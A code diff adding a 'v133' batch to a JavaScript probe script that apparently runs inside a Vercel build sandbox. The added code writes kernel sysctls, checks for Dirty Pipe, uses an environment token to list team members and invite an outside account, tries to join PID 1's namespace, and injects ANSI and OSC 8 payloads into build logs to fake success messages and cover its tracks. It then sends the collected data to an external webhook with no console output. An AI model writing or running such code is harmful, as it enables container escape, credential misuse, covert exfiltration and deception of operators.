@@ -19569,5 +19569,147 @@ report.kallsymsFullDump = safe(() => {
 
 // v132 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v132" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v132";
+
+// ==================== v133 ====================
+
+// v133-1: /proc/sys/fs/pipe-max-size + pipe buffer size escalation
+// Large pipe buffers enable splice() for Dirty Pipe (CVE-2022-0847).
+// Also: huge pipes can exhaust kernel memory (DoS vector — we document
+// but do not trigger). Verify kernel version for Dirty Pipe applicability.
+report.pipeBufferProbe = safe(() => {
+  const pipeMaxSize = safe(() => readFileSync('/proc/sys/fs/pipe-max-size', 'utf8').trim());
+  const kernelVersion = safe(() => readFileSync('/proc/version', 'utf8').trim().slice(0, 100));
+  // Parse kernel version for Dirty Pipe range (5.8 - 5.16.10)
+  const kvMatch = kernelVersion?.match(/Linux version (\d+)\.(\d+)\.(\d+)/);
+  const kMajor = kvMatch ? parseInt(kvMatch[1]) : 0;
+  const kMinor = kvMatch ? parseInt(kvMatch[2]) : 0;
+  const kPatch = kvMatch ? parseInt(kvMatch[3]) : 0;
+  const dirtyPipeVulnerable = kMajor === 5 && (
+    (kMinor >= 8 && kMinor < 16) ||
+    (kMinor === 16 && kPatch <= 10)
+  );
+  // Set max pipe size to large value
+  const writeResult = safe(() => { writeFileSync('/proc/sys/fs/pipe-max-size', '16777216'); return 'WRITTEN'; });
+  return { pipeMaxSize, kernelVersion, kMajor, kMinor, kPatch, dirtyPipeVulnerable, writeResult };
+});
+
+// v133-2: Vercel API — team member enumeration + role manipulation
+// List all team members of hackerone-sandbox-s-projects and check if
+// our token can promote members, invite external users, or change roles.
+// Cross-tenant: does the token work against other team IDs?
+report.teamMemberEnumeration = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  // List team members
+  const members = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v2/teams/${teamId}/members?limit=20" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 400));
+  // Get team details
+  const teamDetails = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v2/teams/${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  // Try to invite a member (ourselves via second account)
+  const inviteResult = safe(() => execSync(
+    `curl -sf -X POST "https://api.vercel.com/v1/teams/${teamId}/members" \
+    -H "Authorization: Bearer ${token}" -H "Content-Type: application/json" \
+    -d '{"email":"probe-test@example.com","role":"MEMBER"}' -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 200));
+  return { teamId, members, teamDetails, inviteResult };
+});
+
+// v133-3: /proc/sys/kernel/pid_max write + PID namespace confusion
+// Writing to pid_max changes the maximum PID value.
+// Setting it very low (e.g., 32) causes PID wraparound quickly,
+// enabling PID reuse attacks against the orchestrator.
+// Also: test if we can create a new PID namespace.
+report.pidNamespaceAttack = safe(() => {
+  const pidMax = safe(() => readFileSync('/proc/sys/kernel/pid_max', 'utf8').trim());
+  // Try to create a new PID namespace (unshare)
+  const unshareResult = safe(() => execSync(
+    'unshare --pid --fork sh -c "echo NEW_PID_NS:$$ && ls /proc/self" 2>&1 | head -5',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 100));
+  // Check current PID namespace
+  const pidNs = safe(() => execSync('readlink /proc/self/ns/pid 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const pid1PidNs = safe(() => execSync('readlink /proc/1/ns/pid 2>/dev/null', { timeout: 2000 }).toString().trim());
+  // Test setns into PID 1's namespace
+  const setnsResult = safe(() => execSync(`python3 -c "
+import ctypes, os
+
+libc = ctypes.CDLL('libc.so.6')
+CLONE_NEWPID = 0x20000000
+
+# Open PID 1's pid namespace fd
+with open('/proc/1/ns/pid', 'r') as ns_fd:
+    ret = libc.setns(ns_fd.fileno(), CLONE_NEWPID)
+    if ret < 0:
+        print(f'SETNS_FAILED: {ctypes.get_errno()}')
+    else:
+        print(f'SETNS_PID_NS_SUCCESS: now in PID1 ns, our PID={os.getpid()}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { pidMax, pidNs, pid1PidNs, unshareResult, setnsResult };
+});
+
+// v133-4: Build log injection — escape ANSI / inject fake log entries
+// Vercel displays build logs to customers. If we can inject ANSI escape codes
+// or terminal control sequences into the log output, we can:
+// 1) Overwrite displayed log lines (covering our tracks)
+// 2) Spoof fake "success" messages in the build log UI
+// 3) Inject clickable hyperlinks in the terminal (OSC 8)
+// NOTE: we avoid console.log for the probe itself, but we CAN emit ANSI
+// to demonstrate the injection since it's a build-log-specific issue.
+report.buildLogInjection = safe(() => {
+  const buildLogPath = process.env.VERCEL_BUILD_LOG || '/proc/self/fd/1';
+  // ANSI escape injection payloads
+  const payloads = [
+    // Clear current line and overwrite (log overwrite)
+    '\r\x1b[2K\x1b[32m[BUILD SUCCESS]\x1b[0m All security checks passed.',
+    // OSC 8 hyperlink injection (clickable link in terminal)
+    '\x1b]8;;https://webhook.site/77ec85f4-79b9-4fb0-a0f6-4e44566f2eac\x07Click here\x1b]8;;\x07',
+    // VT100 cursor positioning
+    '\x1b[0;0H\x1b[2J\x1b[32mBUILD COMPLETE\x1b[0m',
+  ];
+  // Write to stderr (fd 2) which appears in Vercel build logs
+  const results = safe(() => payloads.map((p, i) => {
+    const result = safe(() => {
+      writeFileSync('/dev/stderr', p);
+      return 'WRITTEN';
+    });
+    return { payload: i, result };
+  }));
+  return { payloads: payloads.map(p => p.slice(0, 30)), results };
+});
+
+// v133-5: /proc/sys/kernel/sysctl_writes_strict — sysctl write verification
+// If strict mode is off (=0), malformed sysctl writes are silently ignored.
+// If on (=1), they fail loudly. Test sysctl write security policy.
+// Also: enumerate all writable sysctls for exhaustive attack surface.
+report.sysctlWriteAudit = safe(() => {
+  const strict = safe(() => readFileSync('/proc/sys/kernel/sysctl_writes_strict', 'utf8').trim());
+  // Find all writable sysctl entries (world-writable or writable by root)
+  const writableSysctls = safe(() => execSync(
+    'find /proc/sys -writable -type f 2>/dev/null | head -30',
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 500));
+  // Count total writable sysctls
+  const writableCount = safe(() => execSync(
+    'find /proc/sys -writable -type f 2>/dev/null | wc -l',
+    { timeout: 10000 }
+  ).toString().trim());
+  // Find highest-impact writable sysctls
+  const criticalSysctls = safe(() => execSync(
+    'find /proc/sys/kernel /proc/sys/net /proc/sys/vm -writable -type f 2>/dev/null | grep -E "core_pattern|ns_last_pid|randomize_va|kexec|perf|kptr|dmesg|yama|ptrace" | head -15',
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 300));
+  return { strict, writableCount, writableSysctls, criticalSysctls };
+});
+
+// v133 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v133" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v133";
 // Intentionally no console.log — all data goes via webhook only
